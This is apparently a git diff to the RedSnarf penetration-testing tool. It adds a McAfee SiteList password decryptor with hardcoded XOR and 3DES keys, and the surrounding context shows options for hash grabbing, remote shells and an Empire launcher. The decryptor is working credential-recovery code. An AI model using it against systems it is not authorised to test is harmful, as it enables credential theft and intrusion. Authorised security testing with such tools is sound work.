@@ -73,6 +73,8 @@ except ImportError:
 	logging.error("termcolor missing")
 	exit(1)
 
+from Crypto.Cipher import DES3
+from Crypto.Hash import SHA
 from Crypto.Cipher import AES
 from base64 import b64decode
 from socket import *
@@ -107,7 +109,20 @@ def banner():
 	print colored("R Davy - NCCGroup\n",'red')
 
 
+# hardcoded XOR key
+KEY = "12150F10111C1A060A1F1B1817160519".decode("hex")
 
+def sitelist_xor(xs):
+    return ''.join(chr(ord(c) ^ ord(KEY[i%16]))for i, c in enumerate(xs))
+
+def des3_ecb_decrypt(data):
+    # hardcoded 3DES key
+    key = SHA.new(b'<!@#$%^>').digest() + "\x00\x00\x00\x00"
+    # decrypt
+    des3 = DES3.new(key, DES3.MODE_ECB, "")
+    decrypted = des3.decrypt(data)
+    # quick hack to ignore padding
+    return decrypted[0:decrypted.find('\x00')] or "<empty>"
 
 def dns_server_name(username,password,host,domain_name):
 	user=args.username.strip()
@@ -2232,7 +2247,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5j", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5k", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -2255,6 +2270,7 @@ ugroup.add_argument("-uCIDR", "--cidr", dest="cidr", default="", help="<Optional
 ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
 ugroup.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
+ugroup.add_argument("-uMC", "--mcafee_sites", dest="mcafee_sites", default="n", help="<Optional> Decrypt Mcafee Sites Password")
 ugroup.add_argument("-uJ", "--john_to_pipal", dest="john_to_pipal", default="", help="<Optional> Send passwords cracked with JtR to Pipal for Auditing")
 ugroup.add_argument("-uJW", "--sendtojohn", dest="sendtojohn", default="", help="<Optional> Enter path to NT Hash file to send to JtR")
 ugroup.add_argument("-uJS", "--sendspntojohn", dest="sendspntojohn", default="", help="<Optional> Enter path of SPN Hash file to send to JtR Jumbo")
@@ -2382,6 +2398,7 @@ custom_powershell=args.custom_powershell
 delegated_privs=args.delegated_privs
 windows_updates=args.windows_updates
 xscript=args.xscript
+mcafee_sites=args.mcafee_sites
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
@@ -2404,6 +2421,26 @@ if args.password=='epass':
 	usr_response = raw_input("Enter the password here: ")
 	args.password=usr_response
 	passw=args.password
+
+if mcafee_sites!='n':
+	try:
+		#Decryption Code Source:
+		#https://github.com/funoverip/mcafee-sitelist-pwd-decryption/blob/master/mcafee_sitelist_pwd_decrypt.py
+		print colored("[+]McAfee SiteList Password Decryptor",'green')
+		print colored("[+]Sitelist.xml can normally be found in - C:\Users\All Users\McAfee\Common Framework\Sitelist.xml",'yellow')
+		response=raw_input("[+]Enter encrypted string: ")
+		# read arg
+		encrypted_password = base64.b64decode(response) 
+		# decrypt
+		password = des3_ecb_decrypt(sitelist_xor(encrypted_password))
+
+		print colored("[+]You're password is - ",'yellow')+ password
+		
+	except:
+		print colored("[!]Something went wrong...",'red')
+		sys.exit()
+
+	sys.exit()
 
 if split_spn!='n':
 	#Print function message
